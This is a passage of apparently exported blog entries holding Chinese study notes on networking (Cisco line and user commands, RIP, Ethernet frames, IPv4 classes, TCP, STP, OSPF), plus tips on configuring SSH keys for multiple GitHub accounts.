class="line"><span class="string">Router(config)#username</span> <span class="string">tw</span> <span class="string">privilege</span> <span class="number">15</span> <span class="string">secret</span> <span class="number">123</span></span><br><span class="line"><span class="string">privilege15：该用户权限为15级（级别最高），无需输入enable，可直接进入特权模式（默认级别为1，级别最低）</span></span><br></pre></td></tr></table></figure><h2 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a>查看在线用户</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">R#show</span> <span class="string">users</span></span><br><span class="line"><span class="string">console段表示自己登录到别的设备，vty表示别人登录，*代表自己登录用的line</span></span><br><span class="line"></span><br><span class="line"><span class="string">R#show</span> <span class="string">sessions</span></span><br><span class="line"><span class="string">显示当前所有会话</span></span><br><span class="line"></span><br><span class="line"><span class="string">R#show</span> <span class="string">line</span></span><br><span class="line"><span class="string">显示当前所有线路，*代表有用户在线的line</span></span><br><span class="line"></span><br><span class="line"><span class="string">R#disconnect</span> <span class="number">2</span></span><br><span class="line"><span class="string">断开由自己建立的会话2</span></span><br><span class="line"><span class="string">R#clear</span> <span class="string">line</span> <span class="number">3</span></span><br><span class="line"><span class="string">关闭别的设备登录到自己的会话3</span></span><br></pre></td></tr></table></figure><p>指定只能用ssh登陆<br>transport input ssh</p>]]></content>
      
      
      
        <tags>
            
            <tag> telnet </tag>
            
            <tag> ssh </tag>
            
            <tag> console </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rip</title>
      <link href="/2022/02/19/rip/"/>
      <url>/2022/02/19/rip/</url>
      
        <content type="html"><![CDATA[<h2 id="rip属于哪一层"><a href="#rip属于哪一层" class="headerlink" title="rip属于哪一层"></a>rip属于哪一层</h2><p>按封装顺序来看，是应用层协议。rip是被当作一个应用层进程（虽然它是一个能操作UNIX内核中的转发表的特殊进程)来实现的，所以它能在一个标准套接字上发送和接收报文，并且使用一个标准的运输层协议。rip是一个运行在UDP上的应用层协议。</p><p>从功能来看，是为IP提供路由服务，工作在网络层，认为是属于网络层协议。</p><p>属于哪一层，看从哪方面看，不需要纠结。</p><h2 id="rip版本"><a href="#rip版本" class="headerlink" title="rip版本"></a>rip版本</h2><p>ripv1,ripv2,ripng</p><p>ripng是在rip基础上进行设计出来的，用于基于 IP 版本 6 （IPv6） 的网络。默认情况下，RIPng 处于禁用状态。</p><p>必须启用 IPv6 才能使用 RIPng，多数RIPv2的原理都可以适用于RIPng</p><p>rip我们就指ripv1、ripv2</p><table><thead><tr><th></th><th align="center">ripv1</th><th align="center">ripv2</th><th align="center">ripng</th><th></th></tr></thead><tbody><tr><td>协议号</td><td align="center">17</td><td align="center">17</td><td align="center"></td><td></td></tr><tr><td>端口号</td><td align="center">520</td><td align="center">520</td><td align="center">521</td><td></td></tr><tr><td>管理距离</td><td align="center">120</td><td align="center">120</td><td align="center"></td><td></td></tr></tbody></table><h2 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h2><p>“管理距离”(AD) 代表路由来源的可信度（或优先程度）。RIP 的默认管理距离为 <strong>120</strong>。与其它内部网关协议相比，RIP 路由协议的优先级最低。IS-IS、OSPF、IGRP 和 EIGRP 的默认 AD 值都比 RIP 低。</p><table><thead><tr><th align="left">路由源（路由协议）</th><th align="center">默认管理距离</th></tr></thead><tbody><tr><td align="left">直连路由</td><td align="center">0</td></tr><tr><td align="left">静态到接口</td><td align="center">0</td></tr><tr><td align="left">静态到下一跳</td><td align="center">1</td></tr><tr><td align="left">External BGP</td><td align="center">20</td></tr><tr><td align="left">OSPF</td><td align="center">110</td></tr><tr><td align="left">IS-IS</td><td align="center">115</td></tr><tr><td align="left">PIR V1，V2</td><td align="center">120</td></tr><tr><td align="left">Internal BGP</td><td align="center">200</td></tr><tr><td align="left">未知</td><td align="center">255</td></tr></tbody></table><p>当管理距离为255时，该协议产生的路由是最不可信的，路由条目是不会进入到本地路由表中。</p><p>show ip route 或 show ip protocols 命令查看管理距离</p><h2 id="ripv1、ripv2区别"><a href="#ripv1、ripv2区别" class="headerlink" title="ripv1、ripv2区别"></a>ripv1、ripv2区别</h2><table><thead><tr><th></th><th align="center">ripv1</th><th align="center">ripv2</th></tr></thead><tbody><tr><td>基于协议和端口号</td><td align="center">UDP （520）</td><td align="center">UDP （520）</td></tr><tr><td>路由协议</td><td align="center">有类路由</td><td align="center">无类路由</td></tr><tr><td>周期更新</td><td align="center">更新周期为30秒（25.5-30秒之间随机产生）</td><td align="center">更新周期为30秒（25.5-30秒之间随机产生）</td></tr><tr><td>更新方式</td><td align="center">广播更新(255.255.255.255)，触发更新</td><td align="center">组播更新(224.0.0.9)，触发更新</td></tr><tr><td>认证</td><td align="center">不支持</td><td align="center">支持明文和MD5认证</td></tr><tr><td>路由自动汇总</td><td align="center">默认开启，不能关闭</td><td align="center">默认开启，可以关闭，支持手动汇总</td></tr><tr><td>收发报文</td><td align="center">发出ripv1，接收ripv1、ripv2</td><td align="center">只会发送和接收ripv2</td></tr></tbody></table><h2 id="有类路由和无类路由"><a href="#有类路由和无类路由" class="headerlink" title="有类路由和无类路由"></a>有类路由和无类路由</h2><p>有类路由协议——路由更新时不携带掩码信息</p><p>无类路由协议——路由更新时携带掩码信息</p><h2 id="ripv1发送路由，接收路由规则"><a href="#ripv1发送路由，接收路由规则" class="headerlink" title="ripv1发送路由，接收路由规则"></a>ripv1发送路由，接收路由规则</h2><h3 id="发送路由"><a href="#发送路由" class="headerlink" title="发送路由"></a>发送路由</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">**发送接口的ip，要发送的路由是否与出ip是不是在一个主类</span></span><br><span class="line"><span class="number">1</span><span class="string">.在一个主类，看掩码</span></span><br><span class="line"></span><br><span class="line"><span class="string">掩码相同</span></span><br><span class="line"><span class="string">e.g:路由10.1.2.0/24和接口10.1.12.0/24，发送10.1.2.0</span></span><br><span class="line"></span><br><span class="line"><span class="string">掩码不同，发送主类前缀</span></span><br><span class="line"><span class="string">e.g:路由10.1.3.0/25和接口10.1.12.0/24，发送10.0.0.0</span></span><br><span class="line"></span><br><span class="line"><span class="string">掩码不同，如果主机位有1</span></span><br><span class="line"><span class="string">e.g:路由10.1.1.1/32和接口10.1.12.0/24，发送10.1.1.1</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.如果不在一个主类，掩码相同或不同，发送路由的主类前缀</span></span><br><span class="line"><span class="string">e.g:路由192.168.1.0/25和接口10.1.12.0/24，发送192.168.1.0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="接收路由"><a href="#接收路由" class="headerlink" title="接收路由"></a>接收路由</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">**先看收到的路由与入接口ip是不是在一个主类</span></span><br><span class="line"><span class="number">1</span><span class="string">.在同一个主类，就以入接口的掩码匹配路由的掩码</span></span><br><span class="line"><span class="string">e.g:路由10.1.2.0和入接口10.1.12.0/24,写入路由表10.1.2.0/24</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.在一个主类，收到的直接就是主类路由，以主类掩码匹配</span></span><br><span class="line"><span class="string">e.g:路由10.0.0.0和入接口10.1.12.0/24,写入10.0.0.0/8</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.不在同一主类，就以入接口的掩码匹配路由的掩码</span></span><br><span class="line"><span class="string">e.g:路由192.168.1.0和入接口10.1.12.0/24，写入192.168.1.0/24</span></span><br><span class="line"></span><br><span class="line"><span class="string">如果用入接口掩码匹配时，主机位有1，以32位掩码匹配</span></span><br><span class="line"><span class="string">e.g:路由10.1.1.1和入接口10.1.12.0/24，写入10.1.1.1/32</span></span><br></pre></td></tr></table></figure><h2 id="rip触发更新，被动接口"><a href="#rip触发更新，被动接口" class="headerlink" title="rip触发更新，被动接口"></a>rip触发更新，被动接口</h2><p>RIP触发更新（RIP v1、RIP v2都适用）</p><p>RIP可以调整为在广域网链路上抑制路由更新的发送，而只仅仅在路由有变化时，将有变化的路由发出去，这就是RIP的 触发更新机制，并且是基于接口开启或关闭的,RIP 触发更新只支持在点到点链路上开启或关闭。</p><p>对于Frame-Relay和以太网这样的多路访问接口中，不支持RIP 触发更新，但是Frame-Relay点到点子接口被RIP认为是点到点链路，可以开启触发更新。</p><p>在双方都开启后，相互收到的路由都会被注明永久有效(permanent)而不需要再次收到更新</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在接口上开启触发更新功能。只有在点对点双方均开启之后触发更新才会生效</span></span><br><span class="line"><span class="string">router(config-if)#ip</span> <span class="string">rip</span> <span class="string">triggered</span></span><br><span class="line"><span class="comment">#当一个运行RIP协议的接口被配置为被动接口后，这个接口不发出路由的更新信息但接受路由的更新信息。</span></span><br><span class="line"><span class="string">router(config)#router</span> <span class="string">rip</span> </span><br><span class="line"><span class="string">router(config-router)#passive-interface</span> <span class="string">s1/1</span>             <span class="string">/*将S</span> <span class="number">1</span><span class="string">/1接口配置为被动接口*/</span></span><br></pre></td></tr></table></figure><h2 id="rip定时器"><a href="#rip定时器" class="headerlink" title="rip定时器"></a>rip定时器</h2><table><thead><tr><th align="left">更新计时器</th><th>用于实现对路由条目的周期交互</th><th>30s</th></tr></thead><tbody><tr><td align="left">失效计时器</td><td>如果路由在180s内没有收到更新或确认，那么这条路由被标记为“失效”。但是RIP数据库中仍然存在</td><td>180s(30s+150s)</td></tr><tr><td align="left">刷新计时器</td><td>如果路由设置为16跳开始计时，失效计时器到时，再过60s(思科）或者120s(华为），还没收到路由更新包。路由器就刷新路由表，把不可达的路由条目删掉。</td><td>思科240s，华为300s</td></tr><tr><td align="left">抑制定时器</td><td>当RIP设备收到对端的路由更新，其cost为16，对应路由进入抑制状态，并启动抑制定时器。为了防止路由震荡，在抑制定时器超时之前，即使再收到对端路由cost小于16的更新，也不接受。当抑制定时器超时后，就重新允许接受对端发送的路由更新报文。</td><td>180s</td></tr></tbody></table><p>如果存在触发更新，那么一个路由条目最多需要120s(华为)才能被删除（即为刷新计时器）</p><h2 id="rip路由防环"><a href="#rip路由防环" class="headerlink" title="rip路由防环"></a>rip路由防环</h2><p>水平分割，从某一个邻居获取的路由信息不再向这个邻居发送回去</p><p>路由中毒，把路由表中的路由项设置度量值无穷大（16）</p><p>毒化逆转，把路由表中的路由项中度量值无穷大（16）发送（通告）给rip邻居</p><p>触发更新，通常每30秒发送更新信息，但是一有变化，路由器立即发送新的路由表</p><p>抑制计时，一条路由无效之后，一段时间内这条路由都处于抑制状态（180s），在这个时间内不在接收关于同一目的地址的路由更新</p>]]></content>
      
      
      <categories>
          
          <category> IGP </category>
          
          <category> rip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冗余网关技术</title>
      <link href="/2022/02/17/%E5%86%97%E4%BD%99%E7%BD%91%E5%85%B3%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/02/17/%E5%86%97%E4%BD%99%E7%BD%91%E5%85%B3%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 冗余网关技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VRRP </tag>
            
            <tag> HSRP </tag>
            
            <tag> GLBP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二层帧</title>
      <link href="/2022/01/22/%E4%BA%8C%E5%B1%82%E5%B8%A7/"/>
      <url>/2022/01/22/%E4%BA%8C%E5%B1%82%E5%B8%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="帧的封装"><a href="#帧的封装" class="headerlink" title="帧的封装"></a>帧的封装</h2><p>Ethernet_II帧（用户业务流）:DMAC+SMAC+type+DATA<br>IEEE802.3帧（协议控制帧）:DMAC+SMAC+length+LLC+SNAP+DATA</p><h2 id="Ethernet-II帧格式"><a href="#Ethernet-II帧格式" class="headerlink" title="Ethernet_II帧格式"></a>Ethernet_II帧格式</h2><p><img src="/img/Ethernet_II.jpg"><br>Ethernet_II帧类型值大于等于1536（0x0600）,Length/Type&gt;=1536(0x600)<br>以太2网数据帧的长度在64-1518字节之间<br>1500字节-MTU（最大传输单元）</p><h2 id="IEEE802-3帧格式"><a href="#IEEE802-3帧格式" class="headerlink" title="IEEE802.3帧格式"></a>IEEE802.3帧格式</h2><p><img src="/img/IEEE802.3%E5%B8%A7%E6%A0%BC%E5%BC%8F.jpg"><br>IEEE802.3帧长度字段值小于等于1500（0x05DC）,Length/Type&lt;=1500(0x05DC)</p>]]></content>
      
      
      <categories>
          
          <category> 数据帧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 帧结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ipv4+port分类</title>
      <link href="/2022/01/14/ipv4_port%E5%88%86%E7%B1%BB/"/>
      <url>/2022/01/14/ipv4_port%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="ipv4地址分类"><a href="#ipv4地址分类" class="headerlink" title="ipv4地址分类"></a>ipv4地址分类</h2><p>0.0.0.0 是主机地址</p><p>127开头是环回地址</p><table><thead><tr><th align="center"></th><th align="left">地址范围</th><th>有效地址</th><th>私有地址</th><th>保留地址</th><th>容纳主机数</th></tr></thead><tbody><tr><td align="center">A类地址</td><td align="left">1.0.0.0~126.255.255.255</td><td>1.0.0.1~126.255.255.254</td><td>10.0.0.0~10.255.255.255</td><td>0.x.x.x    127.x.x.x</td><td>0-16777215，16777214</td></tr><tr><td align="center">B类地址</td><td align="left">128.0.0.0~191.255.255.255</td><td>128.0.0.1~191.255.255.254</td><td>172.16.0.0~172.31.255.255</td><td>169.254.x.x</td><td>0-65535，65534</td></tr><tr><td align="center">C类地址</td><td align="left">192.0.0.0~223.255.255.255</td><td>192.0.0.1~223.255.255.254</td><td>192.168.x.x</td><td></td><td>0-255，254</td></tr><tr><td align="center">D类地址</td><td align="left">224.0.0.0~239.255.255.255</td><td></td><td></td><td></td><td></td></tr><tr><td align="center">E类地址</td><td align="left">240.0.0.0~255.255.255.255</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>D类、E类地址不分网络地址和主机地址</p><h2 id="单播，组播，广播"><a href="#单播，组播，广播" class="headerlink" title="单播，组播，广播"></a>单播，组播，广播</h2><table><thead><tr><th align="center">单播</th><th align="center">1对1</th><th align="center">第八位=0</th></tr></thead><tbody><tr><td align="center">组播</td><td align="center">1对N</td><td align="center">第八位=1</td></tr><tr><td align="center">广播</td><td align="center">1对ALL</td><td align="center">所有全为1</td></tr></tbody></table><p>任意播，不是地址，是一种服务</p><p>port端口分类</p><table><thead><tr><th>端口数量</th><th>65536个（即2^16），范围0-65535</th></tr></thead><tbody><tr><td>端口号分类</td><td></td></tr><tr><td>公认端口</td><td>0-1024</td></tr><tr><td>注册端口</td><td>1025-49151</td></tr><tr><td>动态端口</td><td>49152-65535</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> IPv4，端口分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPv4 </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcp</title>
      <link href="/2022/01/10/tcp/"/>
      <url>/2022/01/10/tcp/</url>
      
        <content type="html"><![CDATA[<h2 id="tcp建立连接，三次握手"><a href="#tcp建立连接，三次握手" class="headerlink" title="tcp建立连接，三次握手"></a>tcp建立连接，三次握手</h2><p><img src="/img/tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B.jpg"></p><h2 id="tcp断开连接，四次挥手"><a href="#tcp断开连接，四次挥手" class="headerlink" title="tcp断开连接，四次挥手"></a>tcp断开连接，四次挥手</h2><p><img src="/img/tcp%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 传输层协议 </category>
          
          <category> tcp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tcp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github多账号配置</title>
      <link href="/2021/12/26/github%E5%A4%9A%E8%B4%A6%E5%8F%B7%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/12/26/github%E5%A4%9A%E8%B4%A6%E5%8F%B7%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="电脑关联多个github账号"><a href="#电脑关联多个github账号" class="headerlink" title="电脑关联多个github账号"></a>电脑关联多个github账号</h2><p>为了不必要换github账号时，老是重新设置ssh连接github。</p><h2 id="使用git-bash生成ssh公钥文件"><a href="#使用git-bash生成ssh公钥文件" class="headerlink" title="使用git bash生成ssh公钥文件"></a>使用git bash生成ssh公钥文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &#x27;xxxxx@qq.com&#x27;</span><br><span class="line">要按三下回车</span><br><span class="line">第一次输入文件名</span><br><span class="line">第二次是输入密码，无密码直接回车</span><br><span class="line">第三次是确认密码，无密码直接回车</span><br></pre></td></tr></table></figure><p>windws上文件是保存在C:\Users\用户名.ssh</p><h2 id="生成两对密钥后"><a href="#生成两对密钥后" class="headerlink" title="生成两对密钥后"></a>生成两对密钥后</h2><p>在C:\Users\用户名.ssh下新建config文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1024</span><br><span class="line">Host 1024tiangithub</span><br><span class="line">HostName github.com</span><br><span class="line">User 1024tian</span><br><span class="line">IdentityFile C:\Users\用户名\.ssh\id_rsa_1024</span><br><span class="line"></span><br><span class="line"># 487</span><br><span class="line">Host 1024prophetgithub</span><br><span class="line">HostName github.com</span><br><span class="line">User 1024prophet</span><br><span class="line">IdentityFile C:\Users\用户名\.ssh\id_rsa_487</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>User 用户名，没啥用，就是让你知道这个配置是谁的<br>以后克隆别的仓库要使用 本地主机名（Host），因为在本地，Host会解析成github.com<br>就比如测试git连接github</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@1024tiangithub</span><br><span class="line">ssh -T git@1024prophetgithub</span><br></pre></td></tr></table></figure><p>1024tiangithub会解释成github.com<br>1024prophetgithub会解释成github.com</p><p>克隆仓库方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@1024tiangithub:pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure><p>当然这只是使用ssh克隆仓库要这样改</p><p>如果是使用https方式克隆仓库，随便，不需要这样改</p>]]></content>
      
      
      <categories>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络模拟器配置注意</title>
      <link href="/2021/12/26/%E7%BD%91%E7%BB%9C%E6%A8%A1%E6%8B%9F%E5%99%A8%E9%85%8D%E7%BD%AE%E6%B3%A8%E6%84%8F/"/>
      <url>/2021/12/26/%E7%BD%91%E7%BB%9C%E6%A8%A1%E6%8B%9F%E5%99%A8%E9%85%8D%E7%BD%AE%E6%B3%A8%E6%84%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="思科设备："><a href="#思科设备：" class="headerlink" title="思科设备："></a>思科设备：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">关闭域名解析： no ip domain lookup  </span><br><span class="line">也可以使用crtl+shfit+6</span><br><span class="line"></span><br><span class="line">配置控制台永不超时：</span><br><span class="line">    line console 0</span><br><span class="line">    exec-timeout 0 0</span><br><span class="line">  </span><br><span class="line">防止打断命令输入(阻止控制台信息打断当前输入)：</span><br><span class="line">    line console 0</span><br><span class="line">    logging synchronous</span><br></pre></td></tr></table></figure><h2 id="ensp设备："><a href="#ensp设备：" class="headerlink" title="ensp设备："></a>ensp设备：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打断命令输入：</span><br><span class="line">    undo info-center enable        关闭信息提示，显示设备不要这么做</span><br><span class="line">    undo terminal monitor        关闭控制台显示，也会无法记录log,现实设备不要这么做</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 小技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stp</title>
      <link href="/2021/12/23/stp/"/>
      <url>/2021/12/23/stp/</url>
      
        <content type="html"><![CDATA[<h2 id="STP，生成树协议-IEEE-802-1d-STP"><a href="#STP，生成树协议-IEEE-802-1d-STP" class="headerlink" title="STP，生成树协议,IEEE 802.1d STP"></a>STP，生成树协议,IEEE 802.1d STP</h2><p>Spanning-Tree-Protocol</p><p>第二层网络环路会带来以下问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">广播风暴</span><br><span class="line">多帧复制</span><br><span class="line">MAC地址表的不稳定</span><br></pre></td></tr></table></figure><p>为了解决环路问题，又要保证网络的稳定性和健壮性，产生了STP</p><h3 id="STP三种端口类型"><a href="#STP三种端口类型" class="headerlink" title="STP三种端口类型"></a>STP三种端口类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根端口 RP（root port）</span><br><span class="line">指定端口 DP（designated port）</span><br><span class="line">阻塞端口 AP（alter port）</span><br></pre></td></tr></table></figure><h3 id="每个广播域选择一个根桥"><a href="#每个广播域选择一个根桥" class="headerlink" title="每个广播域选择一个根桥"></a>每个广播域选择一个根桥</h3><h2 id="STP选举"><a href="#STP选举" class="headerlink" title="STP选举"></a>STP选举</h2><h3 id="第一步：选根桥"><a href="#第一步：选根桥" class="headerlink" title="第一步：选根桥"></a>第一步：选根桥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">所有交换机比较BID（bridge id）</span><br><span class="line">BID = 优先级+MAC地址</span><br><span class="line">优先级越小越优先，</span><br><span class="line">优先级相同，比较MAC地址，越小越优先</span><br><span class="line">除了根桥以外，其余都是非根桥</span><br></pre></td></tr></table></figure><h3 id="第二步：选举根端口RP"><a href="#第二步：选举根端口RP" class="headerlink" title="第二步：选举根端口RP"></a>第二步：选举根端口RP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">根端口：每个非根桥离根桥最近的端口</span><br><span class="line">每一个非根交换机有一个</span><br><span class="line">所有非根桥交换机的端口都参与选举</span><br><span class="line"></span><br><span class="line">比较每个端口到根桥的路径开销，开销越小的就是根端口</span><br><span class="line">如果开销都一样，比较端口对端交换机的BID，越小越优先</span><br><span class="line"></span><br><span class="line">如果BID一样，就比较PID</span><br><span class="line">PID = 端口优先级+端口号</span><br><span class="line">优先级越小越优先，优先级相同，端口号小的就是根端口</span><br></pre></td></tr></table></figure><h3 id="第三步：选举指定端口DP"><a href="#第三步：选举指定端口DP" class="headerlink" title="第三步：选举指定端口DP"></a>第三步：选举指定端口DP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根桥上所有端口都是指定端口</span><br><span class="line">每条链路，哪个端口到根桥开销最小，就是指定端口</span><br><span class="line">如果开销相同，比较端口所在交换机的BID，越小越优先</span><br></pre></td></tr></table></figure><p>剩下的就是阻塞端口AP</p><h2 id="五种端口状态"><a href="#五种端口状态" class="headerlink" title="五种端口状态"></a>五种端口状态</h2><table><thead><tr><th>端口状态</th><th>目的</th><th>说明</th></tr></thead><tbody><tr><td>Forwarding（转发）</td><td>接收或转发数据，接收并发送BPDU，开始地址学习</td><td>只有根端口或指定端口才能进入Forwarding状态。（15s）</td></tr><tr><td>Learning（学习）</td><td>不接收或转发数据，接收并发送BPDU，开始地址学习</td><td>过度状态，增加Learning状态防止临时环路。（15s）</td></tr><tr><td>Listening（监听）</td><td>确定端口角色，将选举出根桥、根端口和指定端口，不接收或转发数据，接收并发送BPDU，不进行地址学习</td><td>过度状态。（15s）</td></tr><tr><td>Blocking/Discarding（阻塞）</td><td>不接收或转发数据，接收但不发送BPDU，不进行地址学习</td><td>阻塞端口最终状态。(20s)</td></tr><tr><td>Disabled（禁用）</td><td>端口既不处理和转发BPDU报文，也不转发用户流量，啥也不是状态</td><td>端口状态为Down。（10s）</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 数据链路层协议 </category>
          
          <category> stp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ospf</title>
      <link href="/2021/12/22/ospf/"/>
      <url>/2021/12/22/ospf/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>链路状态路由选择协议，最短路径优先协议，协议号89</p><p>由于OSPF根据收集到的链路状态用最短路径树算法计算路由，从算法本身保证了不会生成自环路由。</p><p>OSPF支持基于接口的明文及MD5 验证。</p><p>OSPF只选择优先级较高的转发，不同优先级的路由中，不能实现负载分担。只有相同优先级的，才能达到负载均衡的目的。</p><h2 id="OSPF属于哪一层"><a href="#OSPF属于哪一层" class="headerlink" title="OSPF属于哪一层"></a>OSPF属于哪一层</h2><p>从封装顺序来看，是封装在IP数据包里面，属于传输层</p><p>从功能来看，是为IP提供路由服务，工作在网络层，认为是属于网络层协议。</p><p>属于哪一层，看从哪方面看，不需要纠结。</p><h2 id="OSPF版本"><a href="#OSPF版本" class="headerlink" title="OSPF版本"></a>OSPF版本</h2><p>OSPF V1、OSPF V2、OSPFV3</p><p>V1、V2用于IPV4， V3用于IPV6</p><h2 id="OSPF的三张表"><a href="#OSPF的三张表" class="headerlink" title="OSPF的三张表"></a>OSPF的三张表</h2><p>邻居表、拓扑表、路由表</p><h2 id="OSPF路由学习方式"><a href="#OSPF路由学习方式" class="headerlink" title="OSPF路由学习方式"></a>OSPF路由学习方式</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.基于224.0.0.5发送hello包，建立邻居关系，维持一张邻居表</span></span><br><span class="line"><span class="number">2</span><span class="string">.当邻居关系建立后，开始交互链路状态信息，构建一张拓扑表</span></span><br><span class="line"><span class="string">拓扑表------LSDB------链路状态数据库---&gt;整个网络拓扑结构</span></span><br><span class="line"><span class="number">3</span><span class="string">.根据拓扑表执行SPF算法（最短路径优先算法），计算最短路径，将最佳路由放入路由表中使用</span></span><br></pre></td></tr></table></figure><h2 id="五种数据包"><a href="#五种数据包" class="headerlink" title="五种数据包"></a>五种数据包</h2><p>网络类型是否支持广播是邻居关系是否能够自动建立的判断条件</p><table><thead><tr><th>1.hello</th><th>建立邻居关系和维持邻居关系，周期发送</th></tr></thead><tbody><tr><td>2.DBD（DD报文）</td><td>链路状态数据库描述</td></tr><tr><td>3.LSR</td><td>链路状态请求</td></tr><tr><td>4.LSU</td><td>链路状态更新</td></tr><tr><td>5.LSACK</td><td>链路状态确认</td></tr></tbody></table><h2 id="OSPF支持的五种网络类型"><a 